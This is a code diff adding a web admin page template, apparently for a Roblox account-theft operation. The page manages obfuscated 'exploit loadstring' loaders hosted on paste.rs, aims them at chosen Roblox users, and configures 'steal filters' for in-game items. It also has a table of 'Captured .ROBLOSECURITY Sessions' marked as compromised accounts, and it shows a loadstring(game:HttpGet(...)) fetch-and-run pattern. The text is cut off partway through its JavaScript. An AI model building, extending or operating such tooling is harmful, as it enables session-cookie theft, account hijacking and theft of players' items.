@@ -1,0 +1,1437 @@
+{% extends 'base.html' %}
+
+{% block title %}Script Configs - SAB Admin{% endblock %}
+{% block page_title %}Script Configurations{% endblock %}
+
+{% block content %}
+<style>
+    /* Premium Configurations Panel CSS */
+    .configs-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 2rem;
+    }
+    
+    .configs-stats {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+        gap: 1rem;
+        margin-bottom: 2rem;
+    }
+    
+    .config-stat-card {
+        background: rgba(17, 24, 39, 0.6);
+        backdrop-filter: blur(8px);
+        border: 1px solid var(--border);
+        border-radius: 0.75rem;
+        padding: 1.25rem;
+        display: flex;
+        flex-direction: column;
+        gap: 0.25rem;
+    }
+    
+    .config-stat-label {
+        font-size: 0.75rem;
+        color: var(--text-secondary);
+        text-transform: uppercase;
+        letter-spacing: 0.05em;
+        font-weight: 600;
+    }
+    
+    .config-stat-val {
+        font-size: 1.75rem;
+        font-weight: 700;
+        color: var(--text-primary);
+    }
+    
+    .configs-grid {
+        display: grid;
+        grid-template-columns: 1fr;
+        gap: 2rem;
+    }
+    
+    .config-card {
+        background: rgba(17, 24, 39, 0.65);
+        backdrop-filter: blur(12px);
+        border: 1px solid var(--border);
+        border-radius: 1rem;
+        overflow: hidden;
+        transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+    }
+    
+    .config-card:hover {
+        border-color: var(--border-hover);
+        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+    }
+    
+    .config-card-header {
+        padding: 1.5rem;
+        border-bottom: 1px solid var(--border);
+        display: flex;
+        justify-content: space-between;
+        align-items: flex-start;
+        background: linear-gradient(180deg, rgba(31, 41, 55, 0.2) 0%, transparent 100%);
+    }
+    
+    .config-title-area {
+        display: flex;
+        flex-direction: column;
+        gap: 0.5rem;
+    }
+    
+    .config-label-title {
+        font-size: 1.25rem;
+        font-weight: 700;
+        color: var(--text-primary);
+        display: flex;
+        align-items: center;
+        gap: 0.75rem;
+    }
+    
+    .config-secret-pill {
+        font-family: monospace;
+        font-size: 0.8rem;
+        color: var(--text-secondary);
+        background: var(--bg-tertiary);
+        padding: 0.25rem 0.5rem;
+        border-radius: 0.375rem;
+        border: 1px solid var(--border);
+    }
+    
+    .target-badge-area {
+        display: flex;
+        align-items: center;
+        gap: 0.5rem;
+        font-size: 0.85rem;
+        color: var(--text-secondary);
+    }
+    
+    .presence-indicator {
+        width: 8px;
+        height: 8px;
+        border-radius: 50%;
+        display: inline-block;
+        background: var(--text-muted);
+    }
+    
+    .presence-indicator.online {
+        background: var(--accent-emerald);
+        box-shadow: 0 0 8px var(--accent-emerald);
+    }
+    
+    .presence-indicator.in-game {
+        background: var(--accent-purple);
+        box-shadow: 0 0 8px var(--accent-purple);
+    }
+    
+    .presence-text {
+        font-weight: 500;
+        font-size: 0.8rem;
+    }
+    
+    .config-card-body {
+        padding: 1.5rem;
+        display: flex;
+        flex-direction: column;
+        gap: 1.5rem;
+    }
+    
+    /* Loadstring Terminal styling */
+    .loadstring-terminal {
+        background: #020617;
+        border: 1px solid rgba(59, 130, 246, 0.2);
+        border-radius: 0.75rem;
+        padding: 1rem;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        gap: 1rem;
+    }
+    
+    .loadstring-code {
+        font-family: 'Courier New', Courier, monospace;
+        font-size: 0.82rem;
+        color: #38bdf8;
+        overflow-x: auto;
+        white-space: nowrap;
+        scrollbar-width: none; /* Firefox */
+        flex-grow: 1;
+    }
+    .loadstring-code::-webkit-scrollbar {
+        display: none; /* Chrome/Safari */
+    }
+    
+    /* Grid details */
+    .config-details-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+        gap: 1.5rem;
+    }
+    
+    .detail-item {
+        background: rgba(31, 41, 55, 0.3);
+        border: 1px solid var(--border);
+        border-radius: 0.5rem;
+        padding: 1rem;
+        display: flex;
+        flex-direction: column;
+        gap: 0.25rem;
+    }
+    
+    .detail-label {
+        font-size: 0.75rem;
+        font-weight: 600;
+        text-transform: uppercase;
+        color: var(--text-muted);
+        letter-spacing: 0.05em;
+    }
+    
+    .detail-value {
+        font-size: 1rem;
+        font-weight: 700;
+        color: var(--text-primary);
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+    }
+    
+    /* Brainrots Drawer */
+    .brainrots-drawer-toggle {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        background: var(--bg-tertiary);
+        border: 1px solid var(--border);
+        border-radius: 0.5rem;
+        padding: 0.75rem 1.25rem;
+        font-weight: 600;
+        color: var(--text-primary);
+        cursor: pointer;
+        transition: background 0.2s;
+    }
+    
+    .brainrots-drawer-toggle:hover {
+        background: rgba(255, 255, 255, 0.05);
+    }
+    
+    .brainrots-drawer-content {
+        max-height: 0;
+        overflow: hidden;
+        transition: max-height 0.35s cubic-bezier(0.4, 0, 0.2, 1);
+        display: flex;
+        flex-direction: column;
+        gap: 1.25rem;
+        border: 0 solid var(--border);
+        border-radius: 0 0 0.5rem 0.5rem;
+        background: rgba(17, 24, 39, 0.4);
+    }
+    
+    .brainrots-drawer-content.open {
+        max-height: 1200px;
+        padding: 1.5rem;
+        border-width: 0 1px 1px 1px;
+        border-color: var(--border);
+        margin-top: -2px;
+    }
+    
+    /* Tab System for Categories */
+    .category-tabs {
+        display: flex;
+        border-bottom: 1px solid var(--border);
+        gap: 0.5rem;
+        margin-bottom: 1rem;
+    }
+    
+    .category-tab-btn {
+        padding: 0.5rem 1rem;
+        background: transparent;
+        border: none;
+        border-bottom: 2px solid transparent;
+        color: var(--text-secondary);
+        font-weight: 600;
+        cursor: pointer;
+        transition: all 0.2s;
+    }
+    
+    .category-tab-btn:hover {
+        color: var(--text-primary);
+    }
+    
+    .category-tab-btn.active {
+        color: var(--accent-blue);
+        border-bottom-color: var(--accent-blue);
+    }
+    
+    .category-tab-pane {
+        display: none;
+    }
+    
+    .category-tab-pane.active {
+        display: block;
+    }
+    
+    .category-bulk-controls {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        background: rgba(31, 41, 55, 0.5);
+        padding: 0.75rem 1rem;
+        border-radius: 0.5rem;
+        border: 1px solid var(--border);
+        margin-bottom: 1rem;
+    }
+    
+    .search-filter-box {
+        margin-bottom: 1rem;
+    }
+    
+    .items-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+        gap: 0.75rem;
+        max-height: 350px;
+        overflow-y: auto;
+        padding-right: 0.5rem;
+    }
+    
+    .items-grid::-webkit-scrollbar {
+        width: 6px;
+    }
+    .items-grid::-webkit-scrollbar-track {
+        background: rgba(0,0,0,0.1);
+    }
+    .items-grid::-webkit-scrollbar-thumb {
+        background: var(--bg-tertiary);
+        border-radius: 3px;
+    }
+    
+    .item-toggle-card {
+        background: rgba(31, 41, 55, 0.4);
+        border: 1px solid var(--border);
+        border-radius: 0.375rem;
+        padding: 0.6rem 0.85rem;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        font-size: 0.88rem;
+        transition: all 0.2s;
+    }
+    
+    .item-toggle-card:hover {
+        background: rgba(31, 41, 55, 0.6);
+        border-color: var(--border-hover);
+    }
+    
+    /* Toggle switches */
+    .switch {
+        position: relative;
+        display: inline-block;
+        width: 38px;
+        height: 20px;
+    }
+    
+    .switch input { 
+        opacity: 0;
+        width: 0;
+        height: 0;
+    }
+    
+    .slider {
+        position: absolute;
+        cursor: pointer;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background-color: var(--bg-tertiary);
+        transition: .3s;
+        border-radius: 20px;
+        border: 1px solid var(--border);
+    }
+    
+    .slider:before {
+        position: absolute;
+        content: "";
+        height: 14px;
+        width: 14px;
+        left: 2px;
+        bottom: 2px;
+        background-color: var(--text-secondary);
+        transition: .3s;
+        border-radius: 50%;
+    }
+    
+    input:checked + .slider {
+        background-color: rgba(59, 130, 246, 0.2);
+        border-color: var(--accent-blue);
+    }
+    
+    input:checked + .slider:before {
+        transform: translateX(18px);
+        background-color: var(--accent-blue);
+    }
+
+    /* Target modal input */
+    .target-edit-wrapper {
+        display: flex;
+        gap: 0.5rem;
+        width: 100%;
+        max-width: 250px;
+    }
+    
+    .target-edit-wrapper input {
+        flex-grow: 1;
+        padding: 0.25rem 0.5rem;
+        font-size: 0.85rem;
+    }
+
+    .modal-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: rgba(0, 0, 0, 0.8);
+        backdrop-filter: blur(8px);
+        z-index: 100;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        opacity: 0;
+        pointer-events: none;
+        transition: opacity 0.3s ease;
+    }
+    
+    .modal-overlay.active {
+        opacity: 1;
+        pointer-events: auto;
+    }
+    
+    .modal-card {
+        background: var(--bg-secondary);
+        border: 1px solid var(--border);
+        border-radius: 1rem;
+        width: 100%;
+        max-width: 500px;
+        padding: 2rem;
+        box-shadow: 0 10px 40px rgba(0,0,0,0.5);
+    }
+
+    /* Roblox User Search Picker Styles */
+    .roblox-user-row {
+        display: flex;
+        align-items: center;
+        gap: 0.75rem;
+        padding: 0.5rem 0.75rem;
+        cursor: pointer;
+        border-radius: 0.375rem;
+        transition: background 0.2s;
+        border-bottom: 1px solid rgba(255,255,255,0.03);
+    }
+    .roblox-user-row:hover {
+        background: rgba(255, 255, 255, 0.08);
+    }
+    .roblox-user-avatar {
+        width: 32px;
+        height: 32px;
+        border-radius: 50%;
+        background: var(--bg-tertiary);
+        flex-shrink: 0;
+        border: 1px solid var(--border);
+    }
+    .roblox-user-info {
+        display: flex;
+        flex-direction: column;
+        flex-grow: 1;
+        overflow: hidden;
+    }
+    .roblox-user-displayname {
+        font-weight: 600;
+        font-size: 0.85rem;
+        color: var(--text-primary);
+        text-overflow: ellipsis;
+        overflow: hidden;
+        white-space: nowrap;
+    }
+    .roblox-user-username {
+        font-size: 0.7rem;
+        color: var(--text-muted);
+    }
+    .roblox-user-status {
+        font-size: 0.7rem;
+        font-weight: bold;
+        padding: 0.15rem 0.4rem;
+        border-radius: 0.25rem;
+        white-space: nowrap;
+    }
+    .roblox-user-status.online {
+        color: var(--accent-emerald);
+        background: rgba(16, 185, 129, 0.12);
+    }
+    .roblox-user-status.in-game {
+        color: var(--accent-purple);
+        background: rgba(168, 85, 247, 0.12);
+    }
+    .roblox-user-status.offline {
+        color: var(--text-muted);
+        background: rgba(255, 255, 255, 0.04);
+    }
+</style>
+
+<div class="configs-header">
+    <div>
+        <p style="color: var(--text-secondary); margin-top: 0.25rem;">Manage custom Roblox script loadstrings, configure target user checking, and select active brainrots.</p>
+    </div>
+    <button class="btn btn-primary" onclick="openCreateConfigModal()">⚙️ New Configuration</button>
+</div>
+
+<!-- Stats -->
+<div class="configs-stats">
+    <div class="config-stat-card">
+        <span class="config-stat-label">Total Configurations</span>
+        <span class="config-stat-val" id="stats-total-configs">{{ configs|length }}</span>
+    </div>
+    <div class="config-stat-card">
+        <span class="config-stat-label">OG Items Catalog</span>
+        <span class="config-stat-val" style="color: var(--accent-amber);">{{ og_items|length }}</span>
+    </div>
+    <div class="config-stat-card">
+        <span class="config-stat-label">Secret Items Catalog</span>
+        <span class="config-stat-val" style="color: var(--accent-purple);">{{ secret_items|length }}</span>
+    </div>
+    <div class="config-stat-card">
+        <span class="config-stat-label">AnToh Catalog</span>
+        <span class="config-stat-val" style="color: var(--accent-emerald);">{{ antoh_items|length }}</span>
+    </div>
+</div>
+
+<!-- Captured Cookies Section -->
+<div class="card" style="margin-bottom: 2rem; border-color: rgba(168, 85, 247, 0.3);">
+    <div class="config-card-header" style="display:flex; justify-content:space-between; align-items:center; background: linear-gradient(180deg, rgba(168, 85, 247, 0.08) 0%, transparent 100%);">
+        <h3 class="card-title" style="display:flex; align-items:center; gap:0.5rem; font-size:1.15rem; font-weight:700; color:var(--text-primary);">🔓 Captured .ROBLOSECURITY Sessions</h3>
+        <span class="badge" style="animation: pulse 2s infinite; background: rgba(168, 85, 247, 0.15); border: 1px solid rgba(168, 85, 247, 0.4); color: #d8b4fe; padding:0.25rem 0.6rem; border-radius:0.375rem; font-size:0.75rem; font-weight:700;">Compromised Accounts</span>
+    </div>
+    <div class="card-body" style="padding: 1.25rem;">
+        <div style="overflow-x: auto;">
+            <table style="width: 100%; border-collapse: collapse; text-align: left; font-size: 0.88rem;">
+                <thead>
+                    <tr style="border-bottom: 2px solid var(--border); color: var(--text-secondary); font-weight:600; font-size:0.75rem; text-transform:uppercase; letter-spacing:0.05em;">
+                        <th style="padding: 0.75rem 0.5rem;">Target User</th>
+                        <th style="padding: 0.75rem 0.5rem;">Session Cookie (.ROBLOSECURITY)</th>
+                        <th style="padding: 0.75rem 0.5rem;">Captured At</th>
+                        <th style="padding: 0.75rem 0.5rem;">Status</th>
+                        <th style="padding: 0.75rem 0.5rem; text-align: right;">Actions</th>
+                    </tr>
+                </thead>
+                <tbody id="capturedCookiesTableBody">
+                    <tr>
+                        <td colspan="5" style="text-align: center; padding: 2rem; color: var(--text-muted); font-style: italic;">
+                            Loading captured account credentials...
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+</div>
+
+<!-- Config List -->
+<div class="configs-grid" id="configsContainer">
+    {% for config in configs %}
+    <div class="config-card" id="config-card-{{ config.id }}" data-id="{{ config.id }}">
+        <!-- Header -->
+        <div class="config-card-header">
+            <div class="config-title-area">
+                <div class="config-label-title">
+                    <span>⚙️ {{ config.label }}</span>
+                    <span class="config-secret-pill" title="Click to copy secret key" onclick="copyText('{{ config.secret_key }}')" style="cursor:pointer">
+                        {{ config.secret_key[:12] }}...{{ config.secret_key[-4:] }} 📋
+                    </span>
+                </div>
+                <div class="target-badge-area">
+                    <span>Target:</span>
+                    {% if config.target_name %}
+                    <a href="https://www.roblox.com/users/{{ config.target_id }}/profile" target="_blank" style="color: var(--accent-blue); text-decoration: none; font-weight: 600;" data-username="{{ config.target_name }}">
+                        {{ config.target_name }} ({{ config.target_id }})
+                    </a>
+                    <span class="presence-indicator" id="presence-dot-{{ config.id }}" data-target-id="{{ config.target_id }}"></span>
+                    <span class="presence-text" id="presence-text-{{ config.id }}">Checking presence...</span>
+                    {% else %}
+                    <span style="color: var(--text-muted); font-style: italic;">None (Global Target Verification Disabled)</span>
+                    {% endif %}
+                </div>
+            </div>
+            
+            <div style="display: flex; gap: 0.5rem;">
+                <button class="btn btn-ghost" style="padding: 0.4rem 0.75rem;" onclick="rotateConfigKey({{ config.id }})" title="Rotate secret key and re-compile script">🔄 Rotate Key</button>
+                <button class="btn btn-danger" style="padding: 0.4rem 0.75rem; background: rgba(239, 68, 68, 0.15); color: var(--accent-rose);" onclick="deleteConfig({{ config.id }})">🗑️ Delete</button>
+            </div>
+        </div>
+        
+        <!-- Card Body -->
+        <div class="config-card-body">
+            <!-- Compiled Loadstring Terminal -->
+            <div style="display: flex; flex-direction: column; gap: 0.5rem;">
+                <span class="detail-label">Compiled Exploit Loadstring Command</span>
+                <div class="loadstring-terminal">
+                    <span class="loadstring-code" id="loadstring-{{ config.id }}">
+                        {{ config.to_dict().loadstring }}
+                    </span>
+                    <button class="btn btn-primary" style="padding: 0.4rem 0.75rem; font-size: 0.85rem;" onclick="copyLoadstring({{ config.id }})">📋 Copy</button>
+                </div>
+            </div>
+
+            <!-- Obfuscation and wrapper format controls -->
+            <div style="display:flex; gap:1.5rem; background:rgba(31, 41, 55, 0.25); border:1px solid var(--border); padding:0.6rem 1rem; border-radius:0.5rem; align-items:center; flex-wrap:wrap; margin-top:-0.5rem;">
+                <div style="display:flex; align-items:center; gap:0.5rem;">
+                    <label class="switch" style="width: 38px; height: 20px;">
+                        <input type="checkbox" id="obfuscate-toggle-{{ config.id }}" {% if config.obfuscate %}checked{% endif %} onchange="updateConfigSettings({{ config.id }})">
+                        <span class="slider"></span>
+                    </label>
+                    <span style="font-size:0.8rem; font-weight:600; color:var(--text-primary)">🔒 Obfuscate Exploit Payload</span>
+                    <span style="font-size:0.68rem; color:var(--text-muted); font-style:italic;">(Hides Lua source code)</span>
+                </div>
+                <div style="display:flex; align-items:center; gap:0.5rem; margin-left:auto;">
+                    <span style="font-size:0.8rem; font-weight:600; color:var(--text-secondary)">Loadstring Provider:</span>
+                    <select id="loadstring-type-{{ config.id }}" class="form-input" style="padding:0.2rem 0.5rem; font-size:0.78rem; height:auto; width:auto; background:var(--bg-tertiary);" onchange="updateConfigSettings({{ config.id }})">
+                        <option value="raw" {% if config.loadstring_type == 'raw' %}selected{% endif %}>Raw (Direct/Paste.rs)</option>
+                        <option value="luaposec" {% if config.loadstring_type == 'luaposec' %}selected{% endif %}>luaposec</option>
+                        <option value="luapot" {% if config.loadstring_type == 'luapot' %}selected{% endif %}>luapot</option>
+                    </select>
+                </div>
+            </div>
+            
+            <!-- Timing and details grid -->
+            <div class="config-details-grid">
+                <!-- Target username edit -->
+                <div class="detail-item" style="overflow: visible; position: relative;">
+                    <span class="detail-label">Update Target Player</span>
+                    <div class="detail-value" style="margin-top: 0.25rem; display:block;">
+                        <form onsubmit="updateConfigTarget(event, {{ config.id }})" style="display:flex; flex-direction:column; gap:0.4rem; width:100%;">
+                            <div style="display:flex; gap:0.3rem; width:100%;">
+                                <input type="text" id="target-search-input-{{ config.id }}" class="form-input" style="font-size:0.85rem; padding:0.25rem 0.5rem;" placeholder="Roblox username" value="{{ config.target_name or '' }}">
+                                <button type="button" class="btn btn-ghost" style="padding: 0.25rem 0.5rem;" onclick="searchRobloxUsers({{ config.id }})">🔍 Search</button>
+                            </div>
+                            <div class="roblox-search-results" id="search-results-{{ config.id }}" style="display:none; max-height:150px; overflow-y:auto; border:1px solid var(--border); border-radius:0.375rem; background:rgba(17,24,39,0.98); position:absolute; left:1rem; right:1rem; z-index:10; padding:0.25rem; box-shadow:0 8px 16px rgba(0,0,0,0.5);"></div>
+                            <input type="hidden" name="target" id="target-hidden-{{ config.id }}" value="{{ config.target_name or '' }}">
+                            <button type="submit" class="btn btn-ghost" style="padding: 0.25rem; width:100%; font-size:0.8rem; font-weight:600;">✓ Commit Target</button>
+                        </form>
+                    </div>
+                </div>
+                
+                <!-- Timing delays form -->
+                <div class="detail-item">
+                    <span class="detail-label">Script Delays</span>
+                    <div class="detail-value" style="margin-top: 0.25rem;">
+                        <form onsubmit="updateConfigDelays(event, {{ config.id }})" style="display:flex; gap:0.4rem; align-items:center; width:100%;">
+                            <div style="display:flex; flex-direction:column; gap:0.1rem; width:45%;">
+                                <span style="font-size:0.6rem; color:var(--text-muted);">Step Delay</span>
+                                <input type="number" name="delay_step" class="form-input" style="padding:0.2rem 0.4rem; font-size:0.85rem;" min="0" value="{{ config.delay_step }}">
+                            </div>
+                            <div style="display:flex; flex-direction:column; gap:0.1rem; width:45%;">
+                                <span style="font-size:0.6rem; color:var(--text-muted);">Cycle Delay</span>
+                                <input type="number" name="trade_cycle_delay" class="form-input" style="padding:0.2rem 0.4rem; font-size:0.85rem;" min="0" value="{{ config.trade_cycle_delay }}">
+                            </div>
+                            <button type="submit" class="btn btn-ghost" style="padding: 0.25rem; margin-top: auto; height: 30px;">✓</button>
+                        </form>
+                    </div>
+                </div>
+                
+                <!-- Items count stats -->
+                <div class="detail-item">
+                    <span class="detail-label">Steal Filter Items Stats</span>
+                    <div class="detail-value" style="margin-top: 0.2rem;">
+                        {% set toggles = config.get_toggles() %}
+                        {% set total_catalog = og_items|length + secret_items|length + antoh_items|length %}
+                        {% set active_count = config.to_dict().brainrot_toggles.values()|select('equalto', true)|list|length %}
+                        <span style="font-size: 1.1rem; font-weight: 700;">
+                            <span id="active-count-{{ config.id }}" style="color:var(--accent-blue)">{{ active_count }}</span>
+                            <span style="color:var(--text-muted)">/ {{ total_catalog }} ON</span>
+                        </span>
+                        <button class="btn btn-ghost" style="padding:0.25rem 0.5rem; font-size:0.75rem;" onclick="toggleDrawer({{ config.id }})">📂 Manage Drawer</button>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Items Toggle Drawer -->
+            <div>
+                <div class="brainrots-drawer-toggle" onclick="toggleDrawer({{ config.id }})">
+                    <span>📦 Granular Item steal filters</span>
+                    <span id="drawer-arrow-{{ config.id }}">▼</span>
+                </div>
+                
+                <div class="brainrots-drawer-content" id="drawer-{{ config.id }}">
+                    <!-- Search inside drawer -->
+                    <div class="search-filter-box">
+                        <input type="text" placeholder="🔍 Search catalog items in this config..." class="form-input" style="font-size:0.85rem;" onkeyup="filterDrawerItems(this, {{ config.id }})">
+                    </div>
+                    
+                    <!-- Tabs -->
+                    <div class="category-tabs">
+                        <button class="category-tab-btn active" id="tab-btn-og-{{ config.id }}" onclick="switchDrawerTab(this, 'og', {{ config.id }})">OG Items ({{ og_items|length }})</button>
+                        <button class="category-tab-btn" id="tab-btn-secret-{{ config.id }}" onclick="switchDrawerTab(this, 'secret', {{ config.id }})">Secret Items ({{ secret_items|length }})</button>
+                        <button class="category-tab-btn" id="tab-btn-antoh-{{ config.id }}" onclick="switchDrawerTab(this, 'antoh', {{ config.id }})">ANTOH ({{ antoh_items|length }})</button>
+                    </div>
+                    
+                    <!-- Tab contents -->
+                    <!-- 1. OG Items tab -->
+                    <div class="category-tab-pane active" id="tab-pane-og-{{ config.id }}">
+                        <div class="category-bulk-controls">
+                            <span style="font-size:0.85rem; color:var(--text-secondary)">Enable/Disable all OG Category items:</span>
+                            <div style="display:flex; gap:0.5rem;">
+                                <button class="btn btn-ghost" style="padding:0.25rem 0.5rem; font-size:0.75rem; color:var(--accent-blue)" onclick="toggleCategory({{ config.id }}, 'og', true)">Enable All</button>
+                                <button class="btn btn-ghost" style="padding:0.25rem 0.5rem; font-size:0.75rem; color:var(--accent-rose)" onclick="toggleCategory({{ config.id }}, 'og', false)">Disable All</button>
+                            </div>
+                        </div>
+                        <div class="items-grid">
+                            {% for item in og_items %}
+                            {% set is_enabled = toggles.get(item, true) %}
+                            <div class="item-toggle-card" data-name="{{ item|lower }}">
+                                <span>{{ item }}</span>
+                                <label class="switch">
+                                    <input type="checkbox" {% if is_enabled %}checked{% endif %} onchange="toggleItem(this, {{ config.id }}, '{{ item }}')">
+                                    <span class="slider"></span>
+                                </label>
+                            </div>
+                            {% endfor %}
+                        </div>
+                    </div>
+                    
+                    <!-- 2. Secret Items tab -->
+                    <div class="category-tab-pane" id="tab-pane-secret-{{ config.id }}">
+                        <div class="category-bulk-controls">
+                            <span style="font-size:0.85rem; color:var(--text-secondary)">Enable/Disable all Secret Category items:</span>
+                            <div style="display:flex; gap:0.5rem;">
+                                <button class="btn btn-ghost" style="padding:0.25rem 0.5rem; font-size:0.75rem; color:var(--accent-blue)" onclick="toggleCategory({{ config.id }}, 'secret', true)">Enable All</button>
+                                <button class="btn btn-ghost" style="padding:0.25rem 0.5rem; font-size:0.75rem; color:var(--accent-rose)" onclick="toggleCategory({{ config.id }}, 'secret', false)">Disable All</button>
+                            </div>
+                        </div>
+                        <div class="items-grid">
+                            {% for item in secret_items %}
+                            {% set is_enabled = toggles.get(item, true) %}
+                            <div class="item-toggle-card" data-name="{{ item|lower }}">
+                                <span>{{ item }}</span>
+                                <label class="switch">
+                                    <input type="checkbox" {% if is_enabled %}checked{% endif %} onchange="toggleItem(this, {{ config.id }}, '{{ item }}')">
+                                    <span class="slider"></span>
+                                </label>
+                            </div>
+                            {% endfor %}
+                        </div>
+                    </div>
+                    
+                    <!-- 3. AnToh Items tab -->
+                    <div class="category-tab-pane" id="tab-pane-antoh-{{ config.id }}">
+                        <div class="category-bulk-controls">
+                            <span style="font-size:0.85rem; color:var(--text-secondary)">Enable/Disable all ANTOH Category items:</span>
+                            <div style="display:flex; gap:0.5rem;">
+                                <button class="btn btn-ghost" style="padding:0.25rem 0.5rem; font-size:0.75rem; color:var(--accent-blue)" onclick="toggleCategory({{ config.id }}, 'antoh', true)">Enable All</button>
+                                <button class="btn btn-ghost" style="padding:0.25rem 0.5rem; font-size:0.75rem; color:var(--accent-rose)" onclick="toggleCategory({{ config.id }}, 'antoh', false)">Disable All</button>
+                            </div>
+                        </div>
+                        <div class="items-grid">
+                            {% for item in antoh_items %}
+                            {% set is_enabled = toggles.get(item, true) %}
+                            <div class="item-toggle-card" data-name="{{ item|lower }}">
+                                <span>{{ item }}</span>
+                                <label class="switch">
+                                    <input type="checkbox" {% if is_enabled %}checked{% endif %} onchange="toggleItem(this, {{ config.id }}, '{{ item }}')">
+                                    <span class="slider"></span>
+                                </label>
+                            </div>
+                            {% endfor %}
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    {% else %}
+    <div class="card" style="text-align: center; padding: 3rem 1.5rem; color: var(--text-muted);">
+        <span style="font-size: 3rem; display: block; margin-bottom: 1rem;">⚙️</span>
+        <h3>No Configurations Found</h3>
+        <p style="margin-top:0.5rem;">Create a configuration loader to get started targeting Roblox accounts and generating scripts.</p>
+    </div>
+    {% endfor %}
+</div>
+
+<!-- Create Modal -->
+<div class="modal-overlay" id="createConfigModal">
+    <div class="modal-card">
+        <div class="modal-header" style="display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid var(--border); padding-bottom:1rem; margin-bottom:1.5rem;">
+            <h3>Create Script Configuration</h3>
+            <button class="close-btn" style="background:transparent; border:none; color:var(--text-secondary); font-size:1.5rem; cursor:pointer;" onclick="closeCreateConfigModal()">&times;</button>
+        </div>
+        
+        <form id="createConfigForm" onsubmit="submitCreateConfig(event)">
+            <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
+            
+            <div class="form-group" style="margin-bottom: 1.25rem;">
+                <label class="form-label">Configuration Label</label>
+                <input type="text" name="label" class="form-input" placeholder="e.g. Main exploit loader, target-X config" required>
+            </div>
+            
+            <div class="form-group" style="margin-bottom: 1.25rem; position: relative;">
+                <label class="form-label">Target Player Roblox Username</label>
+                <div style="display:flex; gap:0.5rem;">
+                    <input type="text" id="target-search-input-create" class="form-input" placeholder="Search target roblox username (optional)">
+                    <button type="button" class="btn btn-ghost" style="padding:0 1rem;" onclick="searchRobloxUsers('create')">🔍 Search</button>
+                </div>
+                <div class="roblox-search-results" id="search-results-create" style="display:none; max-height:160px; overflow-y:auto; border:1px solid var(--border); border-radius:0.375rem; background:var(--bg-secondary); width:100%; margin-top:0.3rem; padding:0.25rem; box-shadow:0 8px 16px rgba(0,0,0,0.5); position:absolute; z-index:99;"></div>
+                <input type="hidden" name="target" id="target-hidden-create">
+                <p style="font-size: 0.72rem; color: var(--text-muted); margin-top: 0.25rem;">Leaves target verification disabled if empty.</p>
+            </div>
+            
+            <div style="display: flex; gap: 1rem; margin-bottom: 1.5rem;">
+                <div class="form-group" style="flex:1;">
+                    <label class="form-label">Step Delay (s)</label>
+                    <input type="number" name="delay_step" class="form-input" min="0" value="1" required>
+                </div>
+                <div class="form-group" style="flex:1;">
+                    <label class="form-label">Trade Cycle Delay (s)</label>
+                    <input type="number" name="trade_cycle_delay" class="form-input" min="0" value="2" required>
+                </div>
+            </div>
+            
+            <div style="display: flex; justify-content: flex-end; gap: 0.75rem;">
+                <button type="button" class="btn btn-ghost" onclick="closeCreateConfigModal()">Cancel</button>
+                <button type="submit" class="btn btn-primary">Generate Loader</button>
+            </div>
+        </form>
+
+        <!-- Generation Results Box -->
+        <div id="createdConfigResult" style="display: none; margin-top: 1.5rem; border-top: 1px solid var(--border); padding-top: 1.25rem;">
+            <p class="form-label" style="color: var(--accent-emerald); font-weight:600;">✓ Compiled to paste.rs successfully!</p>
+            <p style="font-size: 0.8rem; color: var(--text-secondary); margin-bottom: 0.75rem;">Copy the generated loadstring and run in your execution software:</p>
+            <div class="loadstring-terminal" style="margin-bottom:1rem;">
+                <span class="loadstring-code" id="resultLoadstringCode">loadstring(game:HttpGet("..."))()</span>
+                <button class="btn btn-ghost" style="padding: 0.4rem 0.75rem;" onclick="copyResultLoadstring()">📋 Copy</button>
+            </div>
+            <button class="btn btn-primary" style="width:100%;" onclick="window.location.reload()">Continue</button>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+    // Config toggles drawer helper
+    function toggleDrawer(configId) {
+        const drawer = document.getElementById(`drawer-${configId}`);
+        const arrow = document.getElementById(`drawer-arrow-${configId}`);
+        if (drawer.classList.contains('open')) {
+            drawer.classList.remove('open');
+            arrow.textContent = '▼';
+        } else {
+            drawer.classList.add('open');
+            arrow.textContent = '▲';
+            // Start Roblox presence check immediately if drawer is opened
+            checkPresenceForConfig(configId);
+        }
+    }
+    
+    // Tab switching inside drawers
+    function switchDrawerTab(btn, tabName, configId) {
+        // Deactivate all sibling buttons
+        const card = document.getElementById(`config-card-${configId}`);
+        const buttons = card.querySelectorAll('.category-tab-btn');
+        buttons.forEach(b => b.classList.remove('active'));
+        
+        // Activate current button
+        btn.classList.add('active');
+        
+        // Hide all panes
+        const panes = card.querySelectorAll('.category-tab-pane');
+        panes.forEach(p => p.classList.remove('active'));
+        
+        // Show current pane
+        const activePane = card.querySelector(`#tab-pane-${tabName}-${configId}`);
+        if (activePane) activePane.classList.add('active');
+    }
+    
+    // Create Config modal operations
+    function openCreateConfigModal() {
+        document.getElementById('createConfigModal').classList.add('active');
+    }
+    
+    function closeCreateConfigModal() {
+        document.getElementById('createConfigModal').classList.remove('active');
+        document.getElementById('createdConfigResult').style.display = 'none';
+        document.getElementById('createConfigForm').style.display = 'block';
+    }
+    
+    function submitCreateConfig(e) {
+        e.preventDefault();
+        const form = e.target;
+        const formData = new FormData(form);
+        
+        fetch('/configs/create', {
+            method: 'POST',
+            body: formData
+        })
+        .then(res => res.json())
+        .then(data => {
